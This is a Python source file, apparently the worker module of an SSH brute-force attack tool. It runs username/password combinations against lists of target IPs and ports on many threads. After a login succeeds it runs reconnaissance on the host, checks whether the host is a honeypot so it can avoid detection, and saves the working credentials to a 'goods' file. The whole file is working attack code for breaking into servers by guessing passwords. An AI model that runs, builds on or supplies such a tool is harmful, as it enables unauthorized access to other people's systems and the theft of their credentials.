# -*- coding: utf-8 -*-
# core/worker.py

import time
import queue
import logging
import threading
import concurrent.futures
from typing import Iterable, List, Tuple, Optional, Callable

from core.config import (
    Config,
    FILE_PATH,
    Globals
)
from core.stats import Stats, _stats_lock
from core.recon import ReconSystem
from core.honeypot import HoneypotEngine
from core.ssh_client import SSH
from core.models import ServerInfo, HoneypotDetector, SSHTask
from core.result_logger import ResultLogger
from utils.file_manager import FileManager

logger = logging.getLogger(__name__)


class Worker:
    def __init__(
            self,
            combos: List[Tuple[str, str]],
            targets: List[Tuple[str, str]],
            total_tasks: int,
            timeout: int,
            max_workers: int,
            per_worker: int,
            log_file: str = FILE_PATH.DEBUG_FILE,
            goods_file: str = FILE_PATH.GOODS_FILE,
            goods_detailed_file: str = FILE_PATH.DETAILED_FILE,
            honeypot_file: str = FILE_PATH.HONEYPOT_FILE,
            on_success: Optional[Callable[[ServerInfo], None]] = None,
            on_honeypot: Optional[Callable[[ServerInfo], None]] = None,
            on_progress: Optional[Callable[[int, int, int, int], None]] = None
        ) -> None:
        """
        Initialize the Worker.

        Args:
            combos: List of (username, password) tuples
            targets: List of (ip, port) tuples
            total_tasks: Total number of tasks to process
            timeout: SSH connection timeout in seconds
            max_workers: Maximum number of worker threads
            per_worker: Number of concurrent tasks per worker
            log_file: Path to debug log file
            goods_file: Path to successful credentials file
            goods_detailed_file: Path to detailed results file
            honeypot_file: Path to honeypot detection file
            on_success: Callback when valid credentials found (receives ServerInfo)
            on_honeypot: Callback when honeypot detected (receives ServerInfo)
            on_progress: Callback for progress updates (receives goods, errors, honeypots, total)
        """
        self.combos = combos
        self.targets = targets
        self.total_tasks = total_tasks
        self.timeout = timeout
        self.max_workers = max_workers
        self.per_worker = per_worker
        self.log_file = log_file
        self.goods_file = goods_file
        self.goods_detailed_file = goods_detailed_file
        self.honeypot_file = honeypot_file
        self.file_manager = FileManager()
        self.recon = ReconSystem()
        self.logger = ResultLogger(on_success=on_success, on_honeypot=on_honeypot)
        self.honeypot_engine = HoneypotEngine()
        self.on_progress = on_progress
        self.task_q = queue.Queue(
            max(1, self.calculate_optimal_buffer()))

    def _process_wrapper(self, task: SSHTask, semaphore: threading.Semaphore) -> None:
        try:
            self.process_task(task)
        finally:
            semaphore.release()
    

    def run(self) -> None:
        """
        Run the SSH brute force attack.

        Returns when all tasks are completed or when stopped via Globals._stop_event.
        """
        if not self.total_tasks:
            try:
                self.total_tasks = len(self.combos) * len(self.targets)
            except Exception:
                self.total_tasks = 0

        if self.total_tasks == 0:
            logger.warning("No tasks to run. Check your files.")
            return

        Globals._start_time_monotonic = time.perf_counter()

        # Start progress monitor thread if callback provided
        progress_thread = None
        if self.on_progress:
            progress_thread = threading.Thread(
                target=self._progress_monitor,
                daemon=True
            )
            progress_thread.start()

        # Producer fills queue with SSHTask instances
        prod_thread = threading.Thread(target=self.producer, daemon=True)
        prod_thread.start()

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            worker_futures = [pool.submit(self.worker_main, i)
                               for i in range(self.max_workers)]
            prod_thread.join()
            concurrent.futures.wait(worker_futures, timeout=None)

        # Signal threads to stop
        Globals._stop_event.set()
        if progress_thread:
            progress_thread.join(timeout=1.0)

    def _progress_monitor(self) -> None:
        """Monitor and report progress via callback."""
        while not Globals._stop_event.is_set():
            if self.on_progress:
                with _stats_lock:
                    self.on_progress(
                        Stats.Goods.get(),
                        Stats.Errors.get(),
                        Stats.Honeypots.get(),
                        self.total_tasks
                    )
            time.sleep(0.5)

    def producer(self) -> None:
        try:
            for task in self.generate_tasks(self.combos, self.targets):
                if Globals._stop_event.is_set():
                    break
                self.task_q.put(task)
        finally:
            # Send sentinel Nones to let workers finish
            for _ in range(self.max_workers):
                self.task_q.put(None)
    

    def worker_main(self, worker_id: int) -> None:
        semaphore = threading.BoundedSemaphore(
            self.per_worker)
        futures: List[concurrent.futures.Future[None]] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.per_worker) as inner_pool:
            while True:
                if Globals._stop_event.is_set():
                    break
                try:
                    task = self.task_q.get(timeout=0.2)
                except queue.Empty:
                    continue
                if task is None:
                    break
                semaphore.acquire()
                fut = inner_pool.submit(
                    self._process_wrapper, task, semaphore)
                futures.append(fut)
        # Ensure all inner futures complete
        concurrent.futures.wait(futures, timeout=None)
    
    def calculate_optimal_buffer(self) -> int:
        # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (safety factor)
        return int(self.max_workers * self.per_worker * 1.5)

    def generate_tasks(self, combos: Iterable[Tuple[str, str]], targets: Iterable[Tuple[str, str]]) -> Iterable[SSHTask]:
        for u, p in combos:
            for ip, port in targets:
                yield SSHTask(ip=ip, port=port, username=u, password=p)
    
    def process_task(self, task: SSHTask) -> None:
        """Process a single SSH task with safe logging and stats updates."""
        t0 = time.perf_counter()

        try:
            ssh = SSH(
                hostname=task.ip,
                port=int(task.port), 
                username=task.username, 
                password=task.password, 
                timeout=self.timeout
            )

            ssh.connect_safe()

            server = ServerInfo(
                ip=task.ip,
                port=task.port,
                username=task.username,
                password=task.password,
            )

            server.response_time_ms = (time.perf_counter() - t0) * 1000.0

            self.recon.gather_system_info(ssh, server)
            detector = HoneypotDetector()
            server.is_honeypot = self.honeypot_engine.detect(ssh, server, detector)

            if not server.is_honeypot:
                with _stats_lock:
                    Stats.Goods.increment()
                    self.logger.log_debug_file(f"[SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n")
                self.logger.log_success(server)
            else:
                with _stats_lock:
                    Stats.Honeypots.increment()
                self.file_manager.file_append(
                    self.log_file,
                    f"[HONEYPOT SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                )
                self.logger.log_honeypot(server)
        except RuntimeError:
            with _stats_lock:
                Stats.Errors.increment()
        except Exception as ex:
            with _stats_lock:
                Stats.Errors.increment()
            self.logger.log_debug_file(f"[NOT CONNECTED] {task.ip}:{task.port}@{task.username}:{task.password}\n",)